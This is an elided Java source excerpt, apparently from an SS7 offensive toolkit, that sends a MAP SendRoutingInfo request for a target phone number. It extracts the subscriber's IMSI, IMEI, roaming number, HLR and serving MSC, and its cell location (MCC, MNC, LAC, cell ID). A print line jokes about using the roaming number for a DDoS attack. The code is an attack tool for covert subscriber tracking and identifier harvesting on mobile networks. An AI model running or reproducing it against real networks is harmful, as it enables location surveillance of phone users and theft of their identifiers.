...
public class SendRoutingInfo extends SRILowLevel{
    ...
    private void initSCCP() throws Exception {
        ...
        try {
            ...
            // SCCP routing table
            GlobalTitle0100 remoteGT = this.sccpProvider.getParameterFactory().createGlobalTitle
    ...
    private void initiateSRI() throws MAPException {
        ...
        try {
            ...
            GlobalTitle0100 gtTarget = this.sccpProvider.getParameterFactory().createGlobalTitle
                    (MSISDN, 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                            NatureOfAddress.INTERNATIONAL);

            //Creating the GT for Querying GMSC
            GlobalTitle0100 gtGMSC = this.sccpProvider.getParameterFactory().createGlobalTitle
                    (MSC, 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                            NatureOfAddress.INTERNATIONAL);
            ...
            SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory
                    ...
                    gtTarget, SERVER_SPC, SSN_Server);
            ...
            mapDialog.addSendRoutingInformationRequest(msisdn,null,null,InterrogationType.basicCall,
                    false,null,Gmsc,null,null,null,
                    null,null,false,
    ...
    public void onDialogProviderAbort(MAPDialog mapDialog, MAPAbortProviderReason abortProviderReason,
        ...
        System.err.printf("\033[31m[-]\033[0mMAPDialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s\n",
    ...
    public void onDialogReject(MAPDialog mapDialog, MAPRefuseReason refuseReason,
        ...
        System.err.printf("\033[31m[-]\033[0mMAPDialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s\n",
    ...
    public void onDialogUserAbort(MAPDialog mapDialog, MAPUserAbortChoice userReason,
        ...
        System.err.printf("\033[31m[-]\033[0mMAP DialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s\n",
    ...
    public void onProviderErrorComponent(MAPDialog mapDialog, Long invokeId) {
        ...
        System.err.printf("\033[31m[-]\033[0mMAP ProviderErrorComponent for Dialog=%d and invokeId=%d MAPProviderError=%s\n",
                mapDialog.getLocalDialogId(), invokeId);
        System.exit(19);
    }
    ...
    public void onSendRoutingInformationResponse(SendRoutingInformationResponse sendRoutingInformationResponse) {
        try{
            ...
            String imei  = sendRoutingInformationResponse.getSubscriberInfo().getIMEI().getIMEI();
            String imsi = sendRoutingInformationResponse.getIMSI().getData();
            String msrn = sendRoutingInformationResponse.getRoutingInfo2().getRoamingNumber().getAddress();
            String hlr = sendRoutingInformationResponse.getMAPDialog().getRemoteAddress().getGlobalTitle().getDigits();

            String Vmsc = sendRoutingInformationResponse.getVmscAddress().getAddress();
            String status = sendRoutingInformationResponse.getSubscriberInfo().getSubscriberState().getSubscriberStateChoice().toString();


            int mcc = sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMCC();
            int mnc = sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMNC();
            int lac = sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getLac();
            int ci = sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getCellIdOrServiceAreaCode();
            ...
            if(sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().toString().length()==0){
            ...
            if(msrn.isEmpty()){
                ...
                System.out.println("\033[32m[+]\033[0mRoaming Number used to route calls to target(MSRN):\033[31m " + msrn +"\tThinking of a DDoS attack :)");
            }
